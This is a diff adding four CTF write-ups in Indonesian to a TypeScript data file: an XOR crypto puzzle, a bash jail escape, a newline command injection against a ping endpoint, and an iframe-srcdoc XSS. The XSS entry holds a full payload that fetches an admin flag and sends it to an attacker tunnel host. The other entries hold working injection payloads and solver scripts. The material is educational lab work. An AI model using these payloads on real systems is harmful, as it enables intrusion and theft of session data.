@@ -1,6 +1,6 @@
 import type { WriteUp } from '../types';
 
-// Tracebash — 23 writeups
+// Tracebash — 27 writeups
 export const tracebashWriteups: WriteUp[] = [
   {
     "id": "tracebash-crypto-brokentrustprotocol",
@@ -824,5 +824,145 @@ export const tracebashWriteups: WriteUp[] = [
     "terminalOutputs": [],
     "flag": "TBCTF{rules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w}",
     "lessonsLearned": []
+  },
+  {
+    "id": "tracebash-crypto-harmoniccipher-harmoniccipher",
+    "title": "Harmonic Cipher",
+    "category": "Crypto",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tracebash",
+    "tags": [],
+    "description": "File yang dikasih cuma dua:",
+    "problemDescription": "File yang dikasih cuma dua:\n\n- `melody.wav`\n- `ciphertext.bin`\n\n`ciphertext.bin` panjangnya 39 byte, jadi ini kelihatan seperti hasil XOR / stream cipher pendek, bukan blok cipher dengan padding.\n\n`melody.wav` ternyata bukan lagu penuh. Durasi total 8 detik dan tiap 1 detik berisi satu sinus murni. FFT per detik kasih delapan frekuensi ini:\n\n```text\n440, 494, 523, 587, 659, 698, 784, 880\n```\n\nItu not `A B C D E F G A`, tapi yang dipakai bukan nama notnya. Clue yang jalan justru angka frekuensinya sendiri.\n\nKalau setiap frekuensi diambil `mod 256`, key yang keluar:\n\n```text\n[184, 238, 11, 75, 147, 186, 16, 112]\n```\n\nDalam hex:\n\n```text\nb8ee0b4b93ba1070\n```\n\nXOR ciphertext dengan key itu secara repeating menghasilkan plaintext yang langsung valid:\n\n```text\nTBCTF{h4rm0n1c_fr3qu3nc13s_4r3_m3l0d1c}\n```\n\nSolver final ada di `solve.py`.\n\nRun:\n\n```bash\nsource /home/nata/ctf_env/bin/activate\npython3 solve.py\n```",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport wave\r\nfrom pathlib import Path\r\n\r\nimport numpy as np\r\n\r\n\r\nWAV_PATH = Path(\"melody.wav\")\r\nCIPHERTEXT_PATH = Path(\"ciphertext.bin\")\r\n\r\n\r\ndef extract_note_frequencies(path: Path) -> list[int]:\r\n    with wave.open(str(path), \"rb\") as wav_file:\r\n        sample_rate = wav_file.getframerate()\r\n        samples = np.frombuffer(\r\n            wav_file.readframes(wav_file.getnframes()), dtype=\"<i2\"\r\n        ).astype(np.float64)\r\n\r\n    seconds = len(samples) // sample_rate\r\n    frequencies = []\r\n    for second in range(seconds):\r\n        chunk = samples[second * sample_rate : (second + 1) * sample_rate]\r\n        windowed = chunk * np.hanning(len(chunk))\r\n        spectrum = np.fft.rfft(windowed)\r\n        freqs = np.fft.rfftfreq(len(windowed), d=1 / sample_rate)\r\n        spectrum[0] = 0\r\n        dominant = int(round(freqs[np.abs(spectrum).argmax()]))\r\n        frequencies.append(dominant)\r\n    return frequencies\r\n\r\n\r\ndef xor_repeating(data: bytes, key: bytes) -> bytes:\r\n    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))\r\n\r\n\r\ndef main() -> None:\r\n    ciphertext = CIPHERTEXT_PATH.read_bytes()\r\n    frequencies = extract_note_frequencies(WAV_PATH)\r\n    key = bytes(freq % 256 for freq in frequencies)\r\n    plaintext = xor_repeating(ciphertext, key)\r\n\r\n    print(\"frequencies:\", frequencies)\r\n    print(\"key_hex:\", key.hex())\r\n    print(plaintext.decode())\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "TBCTF{h4rm0n1c_fr3qu3nc13s_4r3_m3l0d1c}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "tracebash-misc-nashjail-nashjail",
+    "title": "Nash Jail",
+    "category": "Misc",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tracebash",
+    "tags": [],
+    "description": "Filter-nya kelihatan galak, tapi `eval \"$input\"` masih jadi titik masuk utama. Huruf, angka, `/`, `.`, `*`, `!`, `%`, tanda kutip, `<`, `>`, `@`, dan `&` diblok. Yang masih boleh dipakai cukup buat main di ekspansi Bash.",
+    "problemDescription": "Filter-nya kelihatan galak, tapi `eval \"$input\"` masih jadi titik masuk utama. Huruf, angka, `/`, `.`, `*`, `!`, `%`, tanda kutip, `<`, `>`, `@`, dan `&` diblok. Yang masih boleh dipakai cukup buat main di ekspansi Bash.\n\nBug yang paling penting ada di awal script:\n\n```bash\nexport PATH=\"\"\nunset $(env | cut -d= -f1)\n```\n\n`PATH` dikosongkan duluan, jadi `env` dan `cut` gagal jalan. Environment tidak benar-benar dibersihkan.",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Inti exploit",
+        "content": "Payload final:\n\n\n\nUrutannya:\n\n1. `: ???????`\n   Menjalankan builtin `:` dengan glob 7 karakter. Argumen terakhir yang masuk ke shell jadi `jail.sh`, lalu bisa diambil lewat `$_`.\n\n2. `__=$_`\n   Simpan `jail.sh` ke variabel `__`.\n\n3. `__=${__#????}`\n   Buang `jail`, hasilnya `.sh`.\n\n4. `__=${__:$#:${##}}`\n   `$#` bernilai `0`, `${##}` bernilai `1`. Jadi ini mengambil 1 karakter mulai offset 0 dari `.sh`, hasilnya `.`.\n\n5. `${__} ????????`\n   `${__}` sekarang adalah builtin `.` (`source`), dan `????????` di direktori kerja match ke `flag.txt`.\n\nKarena glob di-expand urut alfabet, `????????` memilih `flag.txt` sebelum `jail.sh` dan `start.sh`. File flag lalu di-`source`, sehingga isi baris flag muncul di error:\n\n\n\nItu cukup buat ambil flag.",
+        "code": ": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????"
+      },
+      {
+        "title": "Reproduksi",
+        "content": "Jalankan solver:\n\n\n\nOutput penting:",
+        "code": "source /home/nata/ctf_env/bin/activate\npython3 solve.py"
+      },
+      {
+        "title": "Solver Script",
+        "content": "The complete exploit/solver script (solve.py) is provided below:",
+        "code": "#!/usr/bin/env python3\r\nfrom pwn import remote\r\nimport re\r\n\r\nHOST = \"13.127.119.28\"\r\nPORT = 1337\r\n\r\n# Build \".\" from \"jail.sh\", then source the first 8-char glob match: flag.txt.\r\nPAYLOAD = b\": ???????;__=$_;__=${__#????};__=${__:$#:${##}};${__} ????????\"\r\n\r\n\r\ndef main() -> None:\r\n    r = remote(HOST, PORT)\r\n    r.recvuntil(b\"Nash> \")\r\n    r.sendline(PAYLOAD)\r\n    data = r.recvrepeat(2).decode(\"utf-8\", \"ignore\")\r\n    print(data, end=\"\")\r\n\r\n    match = re.search(r\"TBCTF\\{[^}]+\\}\", data)\r\n    if match:\r\n        print(match.group(0))\r\n\r\n    r.close()\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "TBCTF{r357r1c73d_bu7_n07_1mp0551bl3}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "tracebash-web-pingme-pingme",
+    "title": "Ping Me",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tracebash",
+    "tags": [],
+    "description": "Target: https://web-ping-me.tracebash.xyz/",
+    "problemDescription": "Target: https://web-ping-me.tracebash.xyz/",
+    "tools": [],
+    "analysis": "",
+    "solution": [
+      {
+        "title": "Ringkas",
+        "content": "Bug ada di validasi input backend. Filter regex pakai `re.match(r\"^[\\\\d.]+$\", ip, flags=re.MULTILINE)`.\nKarena pakai `MULTILINE`, cukup baris pertama yang valid. Baris berikutnya bisa jadi command baru.\n\nInput juga dibatasi 15 char dan huruf ditolak. Tapi glob shell masih bisa dipakai tanpa huruf.\n`/app/readflag` bisa ditulis jadi `/???/????????` dan panjang total payload masih muat."
+      },
+      {
+        "title": "Titik vuln",
+        "content": "Potongan penting di `app.py`:\n\n- cek huruf: `any(c.isalpha() for c in ip)`\n- regex: `re.match(r\"^[\\d.]+$\", ip, flags=re.MULTILINE)`\n- eksekusi shell: `subprocess.check_output(command, shell=True, executable='/bin/bash', ...)`\n\nMasalah inti:\n\n1. `re.match(..., MULTILINE)` cuma butuh awal string cocok.\n2. Newline tidak ditolak.\n3. Input masuk ke `shell=True`.\n4. Path binary bisa dibentuk pakai wildcard tanpa huruf."
+      },
+      {
+        "title": "Ide exploit",
+        "content": "Pakai payload dua baris:\n\n`0\\n/???/????????`\n\nBaris 1:\n- `0`\n- lolos regex `^[\\d.]+$`\n- dipakai buat `ping`\n\nBaris 2:\n- `/???/????????`\n- di-expand shell jadi `/app/readflag`\n- binary SUID ini print env `FLAG`\n\nCommand final di server jadi bentuk begini:\n\n`ping -c 1 -W 2 0`\n`/app/readflag`"
+      },
+      {
+        "title": "Exploit",
+        "content": "Command uji:",
+        "code": "python3 - <<'PY'\nimport requests\nurl='https://web-ping-me.tracebash.xyz/api/ping'\npayload='0\\n/???/????????'\nr=requests.post(url,data=payload,headers={'Content-Type':'text/plain'},timeout=10)\nprint(r.text)\nPY"
+      },
+      {
+        "title": "Output",
+        "content": "Response berisi hasil ping lalu flag:",
+        "code": "{\"output\":\"PING 0 (127.0.0.1) 56(84) bytes of data.\\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.027 ms\\n\\n--- 0 ping statistics ---\\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\\nrtt min/avg/max/mdev = 0.027/0.027/0.027/0.000 ms\\nTBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}\\n\"}"
+      },
+      {
+        "title": "Payload kenapa muat",
+        "content": "Hitung panjang:\n\n- `0` = 1\n- `\\n` = 1\n- `/???/????????` = 13\n- total = 15\n\nPas dengan limit input server."
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "TBCTF{0ld_5ch00l_c0mm4nd_1nj3c710n_0n_573r01d5}",
+    "lessonsLearned": ""
+  },
+  {
+    "id": "tracebash-web-trustedrules-trustedrules",
+    "title": "Trusted Rules",
+    "category": "Web",
+    "difficulty": "Medium",
+    "points": 0,
+    "date": "2026-07-08",
+    "author": "Nattt",
+    "ctfName": "Tracebash",
+    "tags": [],
+    "description": "Writeup for challenge Trusted Rules",
+    "problemDescription": "",
+    "tools": [],
+    "analysis": "Potongan penting di template:\n\n```html\nsafe = safe.replace(/<\\/?script>/ig, '');\nsafe = safe.replace(/javascript:/ig, '');\nsafe = safe.replace(/on[a-z]+\\s*=/ig, '');\ndocument.getElementById('note-content').innerHTML = policy.createHTML(userNote);\n```\n\nRegex itu tidak menyentuh atribut `srcdoc`. Payload seperti ini masih lolos:\n\n```html\n<iframe srcdoc=\"&lt;script&gt;top.location='https://attacker/'&lt;/script&gt;\"></iframe>\n```\n\nSaat browser merender `iframe`, isi `srcdoc` dibuka sebagai dokumen `about:srcdoc`. Script di dokumen itu bisa jalan dan tetap punya akses same-origin ke aplikasi utama, jadi `fetch('/admin/flag')` ikut membawa cookie `admin_session` milik bot.",
+    "solution": [
+      {
+        "title": "Ringkas",
+        "content": "Bug utamanya ada di `/view`. Input `rule` dimasukkan ke `innerHTML` setelah \"sanitasi\" regex yang cuma buang `<script>`, `javascript:`, dan atribut event handler. Itu masih bisa dibypass pakai `iframe srcdoc`, karena string di dalam `srcdoc` di-decode lagi jadi dokumen baru dan `<script>` di dalamnya tetap jalan.\n\nBot admin mengunjungi URL yang kita submit lewat `/report` selama host dan port cocok dengan `http://web:5000`. Endpoint `/report` sendiri me-rewrite `localhost` ke `web:5000`, jadi URL publik `http://localhost:5000/...` tetap diterima bot."
+      },
+      {
+        "title": "1. Siapkan endpoint penerima",
+        "content": "Saya pakai HTTP server lokal dan reverse tunnel `localhost.run` supaya request dari bot bisa dicatat.\n\n\n\nMisal tunnel yang keluar:",
+        "code": "python3 -m http.server 8003\nssh -R 80:localhost:8003 nokey@localhost.run"
+      },
+      {
+        "title": "2. Buat payload XSS",
+        "content": "Payload final:\n\n\n\nURL yang dikirim ke `/report`:\n\n\n\nKirim dengan:",
+        "code": "<iframe srcdoc=\"&lt;script&gt;fetch('/admin/flag').then(r=>r.text()).then(f=>top.location='https://8edc256df28737.lhr.life/'+encodeURIComponent(f))&lt;/script&gt;\"></iframe>"
+      }
+    ],
+    "terminalOutputs": [],
+    "flag": "TBCTF{rules_c4n_b3_byp4ss3d_1f_y0u_kn0w_h0w}",
+    "lessonsLearned": ""
   }
 ];
